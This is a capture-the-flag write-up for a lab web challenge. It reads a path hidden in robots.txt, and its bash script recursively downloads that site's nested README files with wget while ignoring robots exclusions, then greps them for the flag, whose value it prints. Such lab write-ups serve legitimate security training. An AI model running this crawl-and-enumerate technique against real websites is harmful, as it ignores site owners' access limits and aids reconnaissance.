# 11_Guess_hidden_folder

## Method

/robots.txt contains another entry: .hidden/

the .hidden/ folder contains lots of folders and subfolders and each one of those has its own subfolders.

at bottom of the directory tree there is a README file,

most of the README's contain the same text,

if someone wanted to check all the files that are there, it would probably take a long... long... time, because of the multitude of folders and subfolders

To avoid that it's better to use a script which looks through the files.
This script looks through the README files and finds one that has a unique set of strings

```

#!/bin/bash
# IP USED = 192.168.99.100
mkdir ./folder ; cd ./folder
wget -np -r -A "README*" -nd -l 0 -e robots=off http://192.168.99.100/.hidden/
tmp=`ls | grep README | wc -l`
index=$(($tmp-1))
readme="README."
while [ $index != 0 ]
do
	file=$readme$index
	str=`cat $file | grep 2`
	printf "%s" $str
	index=$(($index-1))
done
str=`cat "README" | grep -E [0-9a-f]{64}`
printf "%s" $str

```

It will download and look through all the folders and read through all README files and,
After a long... long... time, and after printing many lines(It was probably more than 5000 lines LOL) you'll see the final result with the flag at the bottom

```

FINISHED --2020-11-11 16:40:02--
Total wall clock time: 24m 4s
Downloaded: 36558 files, 11M in 0.6s (18.0 MB/s)
99dde1d35d1fdd283924d84e6d9f1d820

```

This flag is shorter than the others: 99dde1d35d1fdd283924d84e6d9f1d820
